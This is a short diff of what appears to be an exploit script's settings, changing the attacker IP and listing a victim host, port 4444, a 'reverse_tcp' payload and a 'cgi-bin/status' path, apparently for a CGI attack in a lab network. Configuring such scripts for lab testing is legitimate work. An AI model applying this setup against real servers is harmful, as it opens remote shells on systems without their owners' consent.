@@ -10,7 +10,7 @@ from core.core import Core
 
 victim_ip = "192.168.56.101"
 victim_port = "80"
-attacker_ip = "192.168.56.102"
+attacker_ip = "192.168.56.1"
 attacker_port = "4444"
 payload = "reverse_tcp"
 cgi_path = "cgi-bin/status"
